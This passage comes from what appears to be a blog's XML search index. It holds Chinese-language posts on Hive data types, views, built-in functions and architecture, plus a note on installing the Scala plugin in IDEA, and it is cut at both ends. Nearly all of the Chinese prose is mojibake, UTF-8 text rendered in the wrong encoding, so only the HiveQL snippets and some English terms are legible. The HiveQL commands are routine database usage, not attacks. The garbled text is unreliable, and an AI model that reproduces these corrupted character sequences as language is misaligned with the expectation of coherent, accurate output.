çš„ç”µå½±ä¸­ï¼Œè¯„åˆ†æœ€é«˜çš„10éƒ¨Comedyç±»ç”µå½±ï¼ˆ8ï¼‰è¯¥å½±è¯„åº“ä¸­å„ç§ç±»å‹ç”µå½±ä¸­è¯„ä»·æœ€é«˜çš„5éƒ¨ç”µå½±ï¼ˆç±»å‹ï¼Œç”µå½±åï¼Œå¹³å‡å½±è¯„åˆ†ï¼‰ï¼ˆ9ï¼‰å„å¹´è¯„åˆ†æœ€é«˜çš„ç”µå½±ç±»å‹ï¼ˆå¹´ä»½ï¼Œç±»å‹ï¼Œå½±è¯„åˆ†ï¼‰ï¼ˆ10ï¼‰æ¯ä¸ªåœ°åŒºæœ€é«˜è¯„åˆ†çš„ç”µå½±åï¼ŒæŠŠç»“æœå­˜å…¥HDFSï¼ˆåœ°åŒºï¼Œç”µå½±åï¼Œå½±è¯„åˆ†ï¼‰]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDEAçš„ç®€å•ä½¿ç”¨]]></title>
    <url>%2F2018%2F06%2F18%2FTools%2FIDEA%2FIDEA%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.å®‰è£… Scala æ’ä»¶é¦–å…ˆ, ç›´æ¥åœ¨ plugin ä¸­æœç´¢å®˜æ–¹çš„ Scala è¯­è¨€åŒ…æ’ä»¶æ˜¯è¿ä¸ä¸Šçš„, è¦éªŒè¯ä¸€äº› UUIDä¹‹ç±»çš„ä¸œè¥¿, åŸå› ä½ æ‡‚çš„ äºæ˜¯ä¹åœ¨ç½‘ä¸Šæœç´¢, æœ‰ä¸€ç¯‡åšå®¢è¯´, çœ‹æœç´¢çš„æ—¶å€™æ˜¾ç¤ºçš„ç‰ˆæœ¬, ç„¶åä¸‹è½½æ­¤ç‰ˆæœ¬å®‰è£…, å¦‚ä¸‹å›¾ä¸­ç”»æ¡†çš„ç‰ˆæœ¬å· ç„¶åå»å®˜ç½‘æ‰¾åˆ°æ­¤ç‰ˆæœ¬å®‰è£…,ä¸‹è½½ä¸‹æ¥ ä»ç£ç›˜å®‰è£… ç®€ç›´ä¸è¦å¤ªå‘ b å“¦!!! ä¸€ç›´è¯´ç‰ˆæœ¬ä¸åŒ¹é…. æˆ‘å°±ä¸€ç›´æ²¡æœ‰æ€€ç–‘ç‰ˆæœ¬çš„é—®é¢˜, ç›´åˆ°çœ‹åˆ° æ€ä¹ˆæ„Ÿè§‰è¿™ä¸ª 2013.3 åœ¨å“ªé‡Œè§åˆ°è¿‡?? æŸ¥äº†ä¸€ä¸‹æˆ‘çš„ idea ç‰ˆæœ¬, ä¸å°±æ˜¯ 2017.3.5å˜› ! éš¾é“ä»–ä»¬æœ‰å…³ç³»?? æŠ±ç€è¯•ä¸€è¯•çš„æ€åº¦, éšä¾¿ä¸‹äº†ä¸€ä¸ª2017.3.15çš„ å±…ç„¶èƒ½è£…ä¸Š?? å¥½å§, é‡å¯, OK äº†! ç”±æ­¤å¯è§, ä¹Ÿä¸è¦å®Œå…¨ç›¸ä¿¡åˆ«äººçš„åšå®¢å•Š!! å¦‚æœä¸è¡Œ, å¤šæ–¹å°è¯•! å°½ä¿¡ä¹¦ä¸å¦‚æ— ä¹¦!]]></content>
      <categories>
        <category>å·¥å…·</category>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>å·¥å…·</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hiveå­¦ä¹ â€”2]]></title>
    <url>%2F2018%2F06%2F14%2FHadoop%2F3-Hive%2FHive%E5%AD%A6%E4%B9%A0-2%2F</url>
    <content type="text"><![CDATA[hiveæ•°æ®ç±»å‹1) åŸå­æ•°æ®ç±»å‹ TinyIntï¼š1byteæœ‰ç¬¦å·æ•´æ•° SmallIntï¼š2byteæœ‰ç¬¦å·æ•´æ•° Intï¼š4byteæœ‰ç¬¦å·æ•´æ•° BigIntï¼š8byteæœ‰ç¬¦å·æ•´æ•° Floatï¼šå•ç²¾åº¦æµ®ç‚¹æ•° Doubleï¼šåŒç²¾åº¦æµ®ç‚¹æ•° Booleanï¼šå¸ƒå°”ç±»å‹ Stringï¼šå­—ç¬¦ä¸² TimeStampï¼šæ•´æ•° 2) å¤æ‚æ•°æ®ç±»å‹ Array\&lt;Type> ç”±ä¸€ç³»åˆ—ç›¸åŒæ•°æ®ç±»å‹çš„å…ƒç´ ç»„æˆ è¿™äº›å…ƒç´ å¯ä»¥é€šè¿‡ ä¸‹æ ‡ æ¥è®¿é—® æŸ¥è¯¢æ—¶å¦‚æœæŸ¥åˆ°è¿”å›å“åº”å€¼ï¼Œæ²¡æŸ¥åˆ°åˆ™è¿”å›nullå»ºè¡¨ï¼šcreate table person(name string,work_locations array\&lt;string>)row format delimited fields terminated by â€˜\tâ€™collection items terminated by â€˜,â€™;å¯¼å…¥æ•°æ®ï¼šload data local inpath â€˜/home/sigeon/person.txtâ€™ into table person;æŸ¥è¯¢Select work_locations[0] from person; Map&lt;KType, VType&gt; åŒ…å« key-value é”®å€¼å¯¹ å¯ä»¥é€šè¿‡ key æ¥è®¿é—®å…ƒç´ å»ºè¡¨è¯­å¥ï¼šcreate table score(name string, scores map)row format delimited fields terminated by â€˜\tâ€™collection items terminated by â€˜,â€™map keys terminated by â€˜:â€™;å¯¼å…¥æ•°æ®ï¼šload data local inpath â€˜/home/sigeon/score.txtâ€™ into table score;æŸ¥è¯¢è¯­å¥ï¼šSelect scores[â€˜Chineseâ€™] from score; Struct&lt;Param1:Type1, Param1:Type1, â€¦ &gt; å¯ä»¥åŒ…å«ä¸åŒæ•°æ®ç±»å‹çš„å…ƒç´ ç±»ä¼¼äºcè¯­è¨€ä¸­çš„ç»“æ„ä½“ è¿™äº›å…ƒç´ å¯ä»¥é€šè¿‡ ç‚¹è¯­æ³• çš„æ–¹å¼æ¥å¾—åˆ°å»ºè¡¨è¯­å¥ï¼šcreate table course(id int,course struct&lt;name:string, score:int&gt;)row format delimited fields terminated by â€˜\tâ€™collection items terminated by â€˜,â€™;å¯¼å…¥æ•°æ®ï¼šload data local inpath â€˜/ home/sigoen/course.txtâ€™ into table course;æŸ¥è¯¢è¯­å¥ï¼šSelect c.course.score from course c; å‡ ä¸ªåˆ†éš”ç¬¦ æŒ‡å®šåˆ†éš”ç¬¦è¦æŒ‰ä»å¤–å‘å†…çš„é¡ºåºï¼Œå­—æ®µ -&gt; é›†åˆå…ƒç´  -&gt;map k-v ROW FORMATï¼šæŒ‡å®šåˆ†éš”ç¬¦çš„å…³é”®å­— DELIMITED FIELDS TERMINATED BYï¼šå­—æ®µåˆ†éš”ç¬¦ COLLECTION ITEMS TERMINATED BYï¼šé›†åˆå…ƒç´ åˆ†éš”ç¬¦ï¼ˆArray ä¸­çš„å„å…ƒç´ ã€Struct ä¸­çš„å„å…ƒç´ ã€ Map ä¸­çš„ key-value å¯¹ä¹‹é—´ï¼‰ MAP KEYS TERMINATED BYï¼šMap ä¸­ key ä¸ value çš„åˆ†éš”ç¬¦ LINES TERMINATED BYï¼šè¡Œä¹‹é—´çš„åˆ†éš”ç¬¦ hiveè§†å›¾ å’Œå…³ç³»å‹æ•°æ®åº“ä¸€æ ·ï¼ŒHiveä¹Ÿæä¾›äº†è§†å›¾çš„åŠŸèƒ½ Hive çš„è§†å›¾å’Œå…³ç³»å‹æ•°æ®åº“çš„è§†å›¾æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼š 1ã€åªæœ‰é€»è¾‘è§†å›¾ï¼Œæ²¡æœ‰ç‰©åŒ–è§†å›¾ï¼› 2ã€è§†å›¾åªèƒ½æŸ¥è¯¢ï¼Œä¸èƒ½å¢åˆ æ”¹ (Load|Insert/Update/Delete) æ•°æ®ï¼› 3ã€è§†å›¾åœ¨åˆ›å»ºæ—¶å€™ï¼Œåªæ˜¯ä¿å­˜äº†ä¸€ä»½å…ƒæ•°æ® (å­˜åœ¨TBLSä¸­)ï¼Œå½“æŸ¥è¯¢è§†å›¾çš„æ—¶å€™ï¼Œæ‰å¼€å§‹æ‰§è¡Œè§†å›¾å¯¹åº”çš„é‚£äº›å­æŸ¥è¯¢è§†å›¾å…ƒæ•°æ®åªå­˜å‚¨äº†hqlè¯­å¥ï¼Œè€Œä¸æ˜¯æ‰§è¡Œç»“æœ è§†å›¾æ“ä½œ åˆ›å»ºè§†å›¾ 1create view my_view as &lt;select * from mytable&gt; [limit 500]; æŸ¥çœ‹è§†å›¾ show tables; // æ˜¾ç¤ºæ‰€æœ‰è¡¨å’Œè§†å›¾ show views; //æ˜¾ç¤ºæ‰€æœ‰è§†å›¾ desc [formatted] view_name; // æŸ¥çœ‹æŸä¸ªå…·ä½“è§†å›¾çš„(è¯¦ç»†)ä¿¡æ¯è§†å›¾ç±»å‹ï¼šVIRTUAL_VIEW åˆ é™¤è§†å›¾ drop view [if exists] view_name ä½¿ç”¨è§†å›¾ select count(distinct uid) from my_view; hiveå‡½æ•° å‡½æ•°åˆ†ç±» UDFï¼ˆè‡ªå®šä¹‰å‡½æ•° User-Defined Functionï¼‰ä½œç”¨äºå•ä¸ªæ•°æ®è¡Œï¼Œäº§ç”Ÿä¸€ä¸ªæ•°æ®è¡Œä½œä¸ºè¾“å‡ºã€‚ï¼ˆæ•°å­¦å‡½æ•°ï¼Œå­— ç¬¦ä¸²å‡½æ•°ï¼‰ UDAFï¼ˆç”¨æˆ·å®šä¹‰èšé›†å‡½æ•° User-Defined Aggregation Funcationï¼‰ï¼šæ¥æ”¶å¤šä¸ªè¾“å…¥æ•°æ®è¡Œï¼Œå¹¶äº§ ç”Ÿä¸€ä¸ªè¾“å‡ºæ•°æ®è¡Œã€‚ï¼ˆcountï¼Œmaxï¼‰ UDTFï¼ˆè¡¨æ ¼ç”Ÿæˆå‡½æ•° User-Defined Table Functionï¼‰ï¼šæ¥æ”¶ä¸€è¡Œè¾“å…¥ï¼Œè¾“å‡ºå¤šè¡Œï¼ˆexplodeï¼‰ å†…ç½®å‡½æ•° æŸ¥çœ‹å‡½æ•°å‘½ä»¤ æŸ¥çœ‹å†…ç½®å‡½æ•°ï¼š show functions; æ˜¾ç¤ºå‡½æ•°çš„è¯¦ç»†ä¿¡æ¯ï¼š desc function [extended] fun_name;extendedï¼šæ˜¾ç¤ºæ‰©å±•ä¿¡æ¯ åˆ†ç±» å…³ç³»è¿ç®— åˆ†ç±»\1. ç­‰å€¼æ¯”è¾ƒ: =\2. ç­‰å€¼æ¯”è¾ƒ:&lt;=&gt;\3. ä¸ç­‰å€¼æ¯”è¾ƒ: &lt;&gt;å’Œ!=\4. å°äºæ¯”è¾ƒ: &lt;\5. å°äºç­‰äºæ¯”è¾ƒ: &lt;=\6. å¤§äºæ¯”è¾ƒ: &gt;\7. å¤§äºç­‰äºæ¯”è¾ƒ: &gt;=\8. åŒºé—´æ¯”è¾ƒ\9. ç©ºå€¼åˆ¤æ–­: IS NULL\10. éç©ºåˆ¤æ–­: IS NOT NULL\10. LIKE æ¯”è¾ƒ: LIKE\11. JAVA çš„ LIKE æ“ä½œ: RLIKE\12. REGEXP æ“ä½œ: REGEXP æ•°å­¦è¿ç®— åˆ†ç±»\1. åŠ æ³•æ“ä½œ: +\2. å‡æ³•æ“ä½œ: â€“\3. ä¹˜æ³•æ“ä½œ: *\4. é™¤æ³•æ“ä½œ: /\5. å–ä½™æ“ä½œ: %\6. ä½ä¸æ“ä½œ: &amp;\7. ä½æˆ–æ“ä½œ: |\8. ä½å¼‚æˆ–æ“ä½œ: ^9ï¼ä½å–åæ“ä½œ: ~ é€»è¾‘è¿ç®— åˆ†ç±»\1. é€»è¾‘ä¸æ“ä½œ: AND ã€&amp;&amp;\2. é€»è¾‘æˆ–æ“ä½œ: OR ã€||\3. é€»è¾‘éæ“ä½œ: NOTã€! å¤åˆç±»å‹æ„é€ å‡½æ•° åˆ†ç±» array ç»“æ„ map ç»“æ„\3. struct ç»“æ„\4. named_struct ç»“æ„\5. create_union å¤åˆç±»å‹æ“ä½œç¬¦ \1. è·å– array ä¸­çš„å…ƒç´  \2. è·å– map ä¸­çš„å…ƒç´  \3. è·å– struct ä¸­çš„å…ƒç´  é›†åˆæ“ä½œå‡½æ•° \1. map ç±»å‹å¤§å°ï¼šsize \2. array ç±»å‹å¤§å°ï¼šsize \3. åˆ¤æ–­å…ƒç´ æ•°ç»„æ˜¯å¦åŒ…å«å…ƒç´ ï¼šarray_contains \4. è·å– map ä¸­æ‰€æœ‰ value é›†åˆ \5. è·å– map ä¸­æ‰€æœ‰ key é›†åˆ \6. æ•°ç»„æ’åº \7. è·å–ç´ ç»„æˆ–mapé›†åˆçš„å•ä¸ªå…ƒç´ ï¼ˆk-vå¯¹ï¼‰ï¼šexplode() å½“åŒæ—¶æŸ¥è¯¢ç‚¸è£‚å­—æ®µå’Œæ™®é€šå­—æ®µæ—¶ï¼Œéœ€è¦ä½¿ç”¨æ¨ªå‘è™šæ‹Ÿè§†å›¾ï¼šlateral view å¦‚ï¼šselect name,addr.city from usr_addr lateral view(address) addr as city;è¿™é‡Œä¸€èˆ¬éœ€è¦ç»™ æŸ¥è¯¢ç»“æœ å’Œ ç»“æœå­—æ®µ èµ·åˆ«åï¼Œä¸ç„¶æ²¡åŠæ³•è·å¾—æ¯ä¸ªå­—æ®µï¼Œå¦‚æœåªæ˜¯æŸ¥è¯¢æ‰€æœ‰çš„è¯å°±ä¸éœ€è¦äº† ç±»å‹è½¬æ¢å‡½æ•° \1. äºŒè¿›åˆ¶è½¬æ¢ï¼šbinary \2. åŸºç¡€ç±»å‹ä¹‹é—´å¼ºåˆ¶è½¬æ¢ï¼šcast æ•°å€¼è®¡ç®—å‡½æ•° \1. å–æ•´å‡½æ•°: round \2. æŒ‡å®šç²¾åº¦å–æ•´å‡½æ•°: round \3. å‘ä¸‹å–æ•´å‡½æ•°: floor \4. å‘ä¸Šå–æ•´å‡½æ•°: ceil \5. å‘ä¸Šå–æ•´å‡½æ•°: ceiling \6. å–éšæœºæ•°å‡½æ•°: rand \7. è‡ªç„¶æŒ‡æ•°å‡½æ•°: exp \8. ä»¥ 10 ä¸ºåº•å¯¹æ•°å‡½æ•°: log10 \9. ä»¥ 2 ä¸ºåº•å¯¹æ•°å‡½æ•°: log2 \10. å¯¹æ•°å‡½æ•°: log \11. å¹‚è¿ç®—å‡½æ•°: pow \12. å¹‚è¿ç®—å‡½æ•°: power \13. å¼€å¹³æ–¹å‡½æ•°: sqrt \14. äºŒè¿›åˆ¶å‡½æ•°: bin \15. åå…­è¿›åˆ¶å‡½æ•°: hex \16. åè½¬åå…­è¿›åˆ¶å‡½æ•°: unhex \17. è¿›åˆ¶è½¬æ¢å‡½æ•°: conv \18. ç»å¯¹å€¼å‡½æ•°: abs \19. æ­£å–ä½™å‡½æ•°: pmod \20. æ­£å¼¦å‡½æ•°: sin \21. åæ­£å¼¦å‡½æ•°: asin \22. ä½™å¼¦å‡½æ•°: cos \23. åä½™å¼¦å‡½æ•°: acos \24. positive å‡½æ•°: positive \25. negative å‡½æ•°: negative å­—ç¬¦ä¸²å‡½æ•° \1. å­—ç¬¦ ascii ç å‡½æ•°ï¼šascii \2. base64 å­—ç¬¦ä¸² \3. å­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼šconcat \4. å¸¦åˆ†éš”ç¬¦å­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼šconcat_ws \5. æ•°ç»„è½¬æ¢æˆå­—ç¬¦ä¸²çš„å‡½æ•°ï¼šconcat_ws \6. å°æ•°ä½æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²å‡½æ•°ï¼šformat_number \7. å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼šsubstr, substringåºå·ä»1å¼€å§‹ï¼Œå¯ä»¥ä¼ è´Ÿæ•°ï¼Œä»£è¡¨ä»å³å¼€å§‹ \9. å­—ç¬¦ä¸²æŸ¥æ‰¾å‡½æ•°ï¼šinstræ‰¾åˆ°è¿”å›ä¸€ä¸ªæ­£æ•´æ•°ï¼Œæœªæ‰¾åˆ°è¿”å›0 \10. å­—ç¬¦ä¸²é•¿åº¦å‡½æ•°ï¼šlength \11. å­—ç¬¦ä¸²æŸ¥æ‰¾å‡½æ•°ï¼šlocate \12. å­—ç¬¦ä¸²æ ¼å¼åŒ–å‡½æ•°ï¼šprintf \13. å­—ç¬¦ä¸²è½¬æ¢æˆ map å‡½æ•°ï¼šstr_to_map \14. base64 è§£ç å‡½æ•°ï¼šunbase64(string str) \15. å­—ç¬¦ä¸²è½¬å¤§å†™å‡½æ•°ï¼šupper,ucase \16. å­—ç¬¦ä¸²è½¬å°å†™å‡½æ•°ï¼šlower,lcase \17. å»ç©ºæ ¼å‡½æ•°ï¼štrim \18. å·¦è¾¹å»ç©ºæ ¼å‡½æ•°ï¼šltrim \19. å³è¾¹å»ç©ºæ ¼å‡½æ•°ï¼šrtrim \20. æ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢å‡½æ•°ï¼šregexp_replace \21. æ­£åˆ™è¡¨è¾¾å¼è§£æå‡½æ•°ï¼šregexp_extract \22. URL è§£æå‡½æ•°ï¼šparse_url \23. json è§£æå‡½æ•°ï¼šget_json_object \24. ç©ºæ ¼å­—ç¬¦ä¸²å‡½æ•°ï¼šspace \25. é‡å¤å­—ç¬¦ä¸²å‡½æ•°ï¼šrepeat \26. å·¦è¡¥è¶³å‡½æ•°ï¼šlpad \27. å³è¡¥è¶³å‡½æ•°ï¼šrpad \28. åˆ†å‰²å­—ç¬¦ä¸²å‡½æ•°: split \29. é›†åˆæŸ¥æ‰¾å‡½æ•°: find_in_set \30. åˆ†è¯å‡½æ•°ï¼šsentences \31. åˆ†è¯åç»Ÿè®¡ä¸€èµ·å‡ºç°é¢‘æ¬¡æœ€é«˜çš„ TOP-K \32. åˆ†è¯åç»Ÿè®¡ä¸æŒ‡å®šå•è¯ä¸€èµ·å‡ºç°é¢‘æ¬¡æœ€é«˜çš„ TOP-K æ—¥æœŸå‡½æ•° \1. UNIX æ—¶é—´æˆ³è½¬æ—¥æœŸå‡½æ•°: from_unixtime \2. è·å–å½“å‰ UNIX æ—¶é—´æˆ³å‡½æ•°: unix_timestamp \3. æ—¥æœŸè½¬ UNIX æ—¶é—´æˆ³å‡½æ•°: unix_timestamp \4. æŒ‡å®šæ ¼å¼æ—¥æœŸè½¬ UNIX æ—¶é—´æˆ³å‡½æ•°: unix_timestamp \5. æ—¥æœŸæ—¶é—´è½¬æ—¥æœŸå‡½æ•°: to_date \6. æ—¥æœŸè½¬å¹´å‡½æ•°: year \7. æ—¥æœŸè½¬æœˆå‡½æ•°: month \8. æ—¥æœŸè½¬å¤©å‡½æ•°: day \9. æ—¥æœŸè½¬å°æ—¶å‡½æ•°: hour \10. æ—¥æœŸè½¬åˆ†é’Ÿå‡½æ•°: minute \11. æ—¥æœŸè½¬ç§’å‡½æ•°: second \12. æ—¥æœŸè½¬å‘¨å‡½æ•°: weekofyear \13. æ—¥æœŸæ¯”è¾ƒå‡½æ•°: datediff \14. æ—¥æœŸå¢åŠ å‡½æ•°: date_add \15. æ—¥æœŸå‡å°‘å‡½æ•°: date_sub æ¡ä»¶å‡½æ•° \1. If å‡½æ•°: if( æ¡ä»¶ ï¼Œtrueè¿”å›å‚æ•°ï¼Œfalseè¿”å›å‚æ•° ) \2. å½“param1ä¸ä¸ºnullè¿”å›param1ï¼Œå¦åˆ™è¿”å›param2ï¼šnvl(param1, param2) \2. éç©ºæŸ¥æ‰¾å‡½æ•°: coalesce \3. æ¡ä»¶åˆ¤æ–­å‡½æ•°ï¼šcase æ··åˆå‡½æ•° åˆ†ç±»\1. è°ƒç”¨ Java å‡½æ•°ï¼šjava_method\2. è°ƒç”¨ Java å‡½æ•°ï¼šreflect\3. å­—ç¬¦ä¸²çš„ hash å€¼ï¼šhash XPath è§£æ XML å‡½æ•° åˆ†ç±»\1. xpath\2. xpath_string\3. xpath_boolean\4. xpath_short, xpath_int, xpath_long\5. xpath_float, xpath_double, xpath_number æ±‡æ€»ç»Ÿè®¡å‡½æ•°ï¼ˆUDAFï¼‰ \1. ä¸ªæ•°ç»Ÿè®¡å‡½æ•°: count \2. æ€»å’Œç»Ÿè®¡å‡½æ•°: sum \3. å¹³å‡å€¼ç»Ÿè®¡å‡½æ•°: avg \4. æœ€å°å€¼ç»Ÿè®¡å‡½æ•°: min \5. æœ€å¤§å€¼ç»Ÿè®¡å‡½æ•°: max \6. éç©ºé›†åˆæ€»ä½“å˜é‡å‡½æ•°: var_pop \7. éç©ºé›†åˆæ ·æœ¬å˜é‡å‡½æ•°: var_samp \8. æ€»ä½“æ ‡å‡†åç¦»å‡½æ•°: stddev_pop \9. æ ·æœ¬æ ‡å‡†åç¦»å‡½æ•°: stddev_samp 10ï¼ä¸­ä½æ•°å‡½æ•°: percentile \11. ä¸­ä½æ•°å‡½æ•°: percentile \12. è¿‘ä¼¼ä¸­ä½æ•°å‡½æ•°: percentile_approx \13. è¿‘ä¼¼ä¸­ä½æ•°å‡½æ•°: percentile_approx \14. ç›´æ–¹å›¾: histogram_numeric \15. é›†åˆå»é‡æ•°ï¼šcollect_set \16. é›†åˆä¸å»é‡å‡½æ•°ï¼šcollect_list è¡¨æ ¼ç”Ÿæˆå‡½æ•° Table-Generating Functions (UDTF) åˆ†ç±»1ï¼æ•°ç»„æ‹†åˆ†æˆå¤šè¡Œï¼šexplode(array)2ï¼Map æ‹†åˆ†æˆå¤šè¡Œï¼šexplode(map) è‡ªå®šä¹‰å‡½æ•° \1. éœ€è¦ç»§æ‰¿ org.apache.hadoop.hive.ql.exec.UDF ç±»ï¼Œå®ç°ä¸€ä¸ªæˆ–å¤šä¸ª evaluate() æ–¹æ³• \2. å°†hiveçš„jaråŒ…æ”¾åœ¨hiveçš„classpathè·¯å¾„ä¸‹ï¼Œè¿›å…¥hiveå®¢æˆ·ç«¯ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šadd jar \; \3. æ£€æŸ¥jaråŒ…æ˜¯å¦æ·»åŠ æˆåŠŸï¼Œæ‰§è¡Œå‘½ä»¤ï¼šlist jars; \4. ç»™è‡ªå®šä¹‰å‡½æ•° æ·»åŠ åˆ«åï¼Œå¹¶åœ¨hiveä¸­ æ³¨å†Œ è¯¥å‡½æ•°ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šcreate temporary function myfunc as â€˜ä¸»ç±»å…¨è·¯å¾„åâ€™;myfuncï¼šè‡ªå®šä¹‰å‡½æ•°åˆ«åè¯¥æ–¹æ³•åˆ›å»ºçš„æ˜¯ä¸´æ—¶å‡½æ•°ï¼Œå½“å‰å®¢æˆ·ç«¯å…³é—­å°±æ²¡æœ‰äº†ï¼Œä¸‹æ¬¡é‡å¤ç¬¬3ï¼Œ4æ­¥ï¼›çœŸå® ç”Ÿäº§ä¸­å°±æ˜¯ä½¿ç”¨è¯¥æ–¹æ³•ï¼ \5. æŸ¥çœ‹hiveå‡½æ•°åº“æœ‰æ²¡æœ‰æˆåŠŸæ·»åŠ ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šshow functions; \6. è°ƒç”¨å‡½æ•°æ—¶é€šè¿‡å‡½æ•°åå’Œå‚æ•°åˆ—è¡¨ç¡®å®šè°ƒç”¨çš„æ˜¯å…·ä½“å“ªä¸€ä¸ªæ–¹æ³•]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Hive-1]]></title>
    <url>%2F2018%2F06%2F13%2FHadoop%2F3-Hive%2Fi-Hive-1%2F</url>
    <content type="text"><![CDATA[1. Hive åˆæ¢1.1 Hive çš„æ•°æ®å­˜å‚¨ Hiveçš„æ•°æ®å­˜å‚¨åŸºäºHadoop HDFS Hiveæ²¡æœ‰ä¸“é—¨çš„æ•°æ®å­˜å‚¨æ ¼å¼ å­˜å‚¨ç»“æ„ä¸»è¦åŒ…æ‹¬ï¼šæ•°æ®åº“ã€æ–‡ä»¶ã€è¡¨ã€è§†å›¾ã€ç´¢å¼• Hiveé»˜è®¤å¯ä»¥ç›´æ¥åŠ è½½æ–‡æœ¬æ–‡ä»¶ï¼ˆTextFileï¼‰ï¼Œè¿˜æ”¯æŒSequenceFileã€RCFile åˆ›å»ºè¡¨æ—¶ï¼ŒæŒ‡å®šHiveæ•°æ®çš„åˆ—åˆ†éš”ç¬¦ä¸è¡Œåˆ†éš”ç¬¦ï¼ŒHiveå³å¯è§£ææ•°æ® 1.2 Hiveçš„ç³»ç»Ÿæ¶æ„ ç”¨æˆ·æ¥å£ï¼ŒåŒ…æ‹¬ CLIï¼ŒJDBC/ODBCï¼ŒWebUI å…ƒæ•°æ®å­˜å‚¨ï¼Œé€šå¸¸æ˜¯å­˜å‚¨åœ¨å…³ç³»æ•°æ®åº“å¦‚ mysql, derby ä¸­ è§£é‡Šå™¨ã€ç¼–è¯‘å™¨ã€ä¼˜åŒ–å™¨ã€æ‰§è¡Œå™¨ Hadoopï¼šç”¨ HDFS è¿›è¡Œå­˜å‚¨ï¼Œåˆ©ç”¨ MapReduce è¿›è¡Œè®¡ç®— 1.3 Hiveçš„ç³»ç»Ÿæ¶æ„ ç”¨æˆ·æ¥å£ä¸»è¦æœ‰ä¸‰ä¸ªï¼šCLIï¼ŒJDBC/ODBCå’Œ WebUI CLIï¼Œå³Shellå‘½ä»¤è¡Œ JDBC/ODBC æ˜¯ Hive çš„Javaï¼Œä¸ä½¿ç”¨ä¼ ç»Ÿæ•°æ®åº“JDBCçš„æ–¹å¼ç±»ä¼¼ WebGUIæ˜¯é€šè¿‡æµè§ˆå™¨è®¿é—® Hive Hive å°†å…ƒæ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“ä¸­(metastore)ï¼Œç›®å‰åªæ”¯æŒ mysqlã€derbyã€‚Hive ä¸­çš„å…ƒæ•°æ®åŒ…æ‹¬è¡¨çš„åå­—ï¼Œè¡¨çš„åˆ—å’Œåˆ†åŒºåŠå…¶å±æ€§ï¼Œè¡¨çš„å±æ€§ï¼ˆæ˜¯å¦ä¸ºå¤–éƒ¨è¡¨ç­‰ï¼‰ï¼Œè¡¨çš„æ•°æ®æ‰€åœ¨ç›®å½•ç­‰ è§£é‡Šå™¨ã€ç¼–è¯‘å™¨ã€ä¼˜åŒ–å™¨å®Œæˆ HQL æŸ¥è¯¢è¯­å¥ä»è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€ç¼–è¯‘ã€ä¼˜åŒ–ä»¥åŠæŸ¥è¯¢è®¡åˆ’ï¼ˆplanï¼‰çš„ç”Ÿæˆã€‚ç”Ÿæˆçš„æŸ¥è¯¢è®¡åˆ’å­˜å‚¨åœ¨ HDFS ä¸­ï¼Œå¹¶åœ¨éšåç”± MapReduce è°ƒç”¨æ‰§è¡Œ Hive çš„æ•°æ®å­˜å‚¨åœ¨ HDFS ä¸­ï¼Œå¤§éƒ¨åˆ†çš„æŸ¥è¯¢ç”± MapReduce å®Œæˆï¼ˆåŒ…å« çš„æŸ¥è¯¢ï¼Œæ¯”å¦‚ select from table ä¸ä¼šç”Ÿæˆ MapRedcue ä»»åŠ¡ 1.4 Hiveçš„metastore metastoreæ˜¯hiveå…ƒæ•°æ®çš„é›†ä¸­å­˜æ”¾åœ°ã€‚ metastoreé»˜è®¤ä½¿ç”¨å†…åµŒçš„derbyæ•°æ®åº“ä½œä¸ºå­˜å‚¨å¼•æ“ Derbyå¼•æ“çš„ç¼ºç‚¹ï¼šä¸€æ¬¡åªèƒ½æ‰“å¼€ä¸€ä¸ªä¼šè¯ ä½¿ç”¨Mysqlä½œä¸ºå¤–ç½®å­˜å‚¨å¼•æ“ï¼Œå¤šç”¨æˆ·åŒæ—¶è®¿é—® 1.5 Hive å’Œ Hadoop çš„è°ƒç”¨å…³ç³» 1ã€æäº¤sql äº¤ç»™é©±åŠ¨2ã€é©±åŠ¨ç¼–è¯‘ è§£æç›¸å…³çš„å­—æ®µè¡¨ä¿¡æ¯3ã€å»metastoreæŸ¥è¯¢ç›¸å…³çš„ä¿¡æ¯ è¿”å›å­—æ®µè¡¨ä¿¡æ¯4ã€ç¼–è¯‘è¿”å›ä¿¡æ¯ å‘ç»™é©±åŠ¨5ã€é©±åŠ¨å‘é€ä¸€ä¸ªæ‰§è¡Œè®¡åˆ’ äº¤ç»™æ‰§è¡Œå¼•æ“6.1ã€DDLs å¯¹æ•°æ®åº“è¡¨çš„æ“ä½œçš„, ç›´æ¥å’Œmetastoreäº¤äº’,create table t1(name string); 6.2ã€å®Œæˆjobè¿”å›æ•°æ®ä¿¡æ¯ã€æ‰¾namenodeæŸ¥æ•°æ®6.3ã€namenodeäº¤äº’select count(1) from t1;7ã€è¿”å›ç»“æœä¿¡æ¯é›† 1.6 Hive å‚æ•°é…ç½®ä½¿ç”¨ å‘½åç©ºé—´ ä½¿ç”¨æƒé™ æè¿° hivevar å¯è¯»å†™ $ hive -d name=zhangsan; hiveconf å¯è¯»å†™ \$ hive â€“hiveconf hive.cli.print.current.db=true; $ hive â€“hiveconf hive.cli.print.header=true; system å¯è¯»å†™ javaå®šä¹‰çš„é…ç½®å±æ€§ï¼Œå¦‚system:user.name env åªè¯» shellç¯å¢ƒå˜é‡ï¼Œå¦‚env:USER hivevar 1234567# 